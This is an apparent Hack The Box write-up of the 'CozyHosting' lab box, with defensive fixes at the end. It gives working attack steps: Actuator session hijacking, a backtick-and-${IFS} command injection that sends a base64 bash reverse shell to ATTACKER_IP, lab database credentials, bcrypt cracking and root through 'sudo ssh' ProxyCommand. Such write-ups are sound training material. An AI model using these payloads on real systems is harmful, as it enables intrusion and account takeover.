+++
title = "CozyHosting"
date = 2026-02-24
description = "Spring Boot app with its Actuator endpoints exposed. /actuator/sessions leaks a logged-in session, the admin dashboard behind it has a command injection in an SSH form, the jar holds the database password, a cracked bcrypt hash is reused for SSH, and sudo ssh gives root."
draft = false

[taxonomies]
tags = ["Spring Boot Actuator", "Session hijacking", "Command injection", "Credentials in config files", "Hash cracking", "Password reuse", "sudo misconfiguration"]

[extra]
platform = "htb"
os = "linux"
difficulty = "easy"
chain = ["Exposed Actuator sessions", "Session hijack", "Command injection", "DB creds in the jar", "sudo ssh ProxyCommand"]
+++

No creds on this one, just an IP.

## Recon

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Port 80 redirects to `http://cozyhosting.htb`, a landing page for a hosting company.

### Spring Boot behind nginx

`/error` gives the framework away:

```text
Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
```

That page is Spring Boot's default, so the wordlist for the next step is the Spring Boot one:

```bash
feroxbuster --url http://cozyhosting.htb \
  --wordlist=/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```

### actuator is wide open

`/login` is there, and so is `/actuator` with `env`, `sessions`, `mappings`, `beans` and `health` under it, all answering 200 without a login.

`/actuator/env` masks its values but still shows `spring.datasource.*` properties for a PostgreSQL backend and the name of the jar, `cloudhosting-0.0.1.jar`. `/actuator/sessions` is the one that matters.

## Foothold: command injection as kanderson

### borrowing a session

`/actuator/sessions` lists the active sessions with their IDs:

```json,hl_lines=3
{
  "855364B960FB1C04CF7835B2FFBD3ABA": "UNAUTHORIZED",
  "DCCBC9C135A4D806D606B8864DB32A1B": "kanderson"
}
```

`kanderson` is logged in, and the key is the session cookie. Set it in the browser console:

```javascript
document.cookie = "JSESSIONID=DCCBC9C135A4D806D606B8864DB32A1B"
```

and `/admin` opens as kanderson.

### backticks in the username field

The dashboard has a "Connection settings" form with a hostname and a username, and the backend runs `ssh` with them. Backticks in the username:

```text
Hostname: 127.0.0.1
Username: `id`
```

```text
ssh: Could not resolve hostname uid=1001(app): Name or service not known
```

The shell ran `id` before `ssh` ever started, and the output ended up in ssh's error message.

### no spaces allowed

The username field rejects spaces. `${IFS}` stands in for them, and the reverse shell goes in base64 so its own spaces and redirects don't matter:

```bash
echo -n "bash -i >& /dev/tcp/ATTACKER_IP/1338 0>&1" | base64
```

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC8xMzM4IDA+JjE=
```

```bash
nc -lvnp 1338
```

Username:

```text
`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC8xMzM4IDA+JjE=|base64${IFS}-d|bash`
```

The shell comes back as `app`, uid 1001.

## Lateral: app to josh

### the database password is in the jar

The jar from `/actuator/env` sits in `/app`. A jar is a zip, so the config can be read straight out of it:

```bash
unzip -p cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
```

```ini,hl_lines=3
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

```bash
psql -h 127.0.0.1 -U postgres -d cozyhosting -W
```

```sql
SELECT * FROM users;
```

```text,hl_lines=4
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

### cracking admin

Two bcrypt hashes. The admin one:

```bash
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

It cracks to `manchesterunited`.

`/etc/passwd` has a user `josh` with uid 1003, and the web admin's password is his SSH password too:

```bash
ssh josh@cozyhosting.htb
```

## Privesc: sudo ssh

```bash
sudo -l
```

```text,hl_lines=2
User josh may run the following commands on cozyhosting:
    (root) /usr/bin/ssh *
```

`ssh` as root with any arguments. `ProxyCommand` tells ssh to run a command of my choosing to set up the connection, and under sudo that command runs as root:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

done.

## What could CozyHosting improve?

- don't expose Actuator. `/actuator/sessions` hands out live session IDs to anyone, and the rest of the endpoints describe the application to them.
- never build a shell command out of form input. The space filter on the username stopped nothing, `${IFS}` got around it.
- the web admin's password should not be a system user's SSH password, and it should not be in rockyou.
- `sudo ssh *` is root. The wildcard lets josh pass any option, so the rule has to be one fixed command without it.

## Appendix

- [feroxbuster](https://github.com/epi052/feroxbuster)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [hashcat](https://hashcat.net/hashcat/)
- [GTFOBins: ssh](https://gtfobins.github.io/gtfobins/ssh/)
